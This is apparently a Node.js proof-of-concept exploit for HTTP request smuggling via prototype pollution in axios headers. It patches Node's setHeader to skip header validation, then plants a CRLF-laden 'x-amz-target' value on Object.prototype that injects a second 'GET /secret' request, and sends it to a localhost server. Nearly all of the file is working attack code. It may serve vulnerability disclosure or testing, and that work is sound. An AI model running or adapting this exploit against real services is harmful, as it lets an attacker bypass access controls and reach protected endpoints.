const http = require('http');
const axios = require('axios')


const _probe = new http.OutgoingMessage();
_probe.setHeader('__probe', 'v');
const kOutHeaders = Object.getOwnPropertySymbols(_probe).find((s) => {
    const v = _probe[s];
    return v && typeof v === 'object' && '__probe' in v;
});

if (!kOutHeaders) {
    console.error('Could not locate kOutHeaders symbol – PoC requires Node.js >=14');
    process.exit(1);
}

const _origSetHeader = http.OutgoingMessage.prototype.setHeader;
http.OutgoingMessage.prototype.setHeader = function (name, value) {
    try {
        return _origSetHeader.call(this, name, value);
    } catch {
        if (this[kOutHeaders] === null) this[kOutHeaders] = Object.create(null);
        this[kOutHeaders][name.toLowerCase()] = [name, value];
        return this;
    }
};


// This would normally be injected by a vulnerable library (qs, minimist, body-parser, etc.)
Object.prototype['x-amz-target'] = "dummy\r\n\r\nGET /secret HTTP/1.1\r\nHost: localhost:3000";


const defaultsHeaders = { Accept: 'application/json' };
const mergedHeaders = { Host: `localhost:3000` };
for (const key in defaultsHeaders) {
  mergedHeaders[key] = defaultsHeaders[key];
  const display = String(defaultsHeaders[key]).replace(/\r/g, '\\r').replace(/\n/g, '\\n');
  const tag = key === 'x-amz-target' ? '  ← INJECTED!' : '';
  console.log('    %s: %s%s', key, display, tag);
}

console.log(`Node: ${process.version}`);

axios.get('http://localhost:3000/health', {
    headers: mergedHeaders
}).then(response => {
    console.log(response.data);
}).catch(error => {
    console.error(error);
});
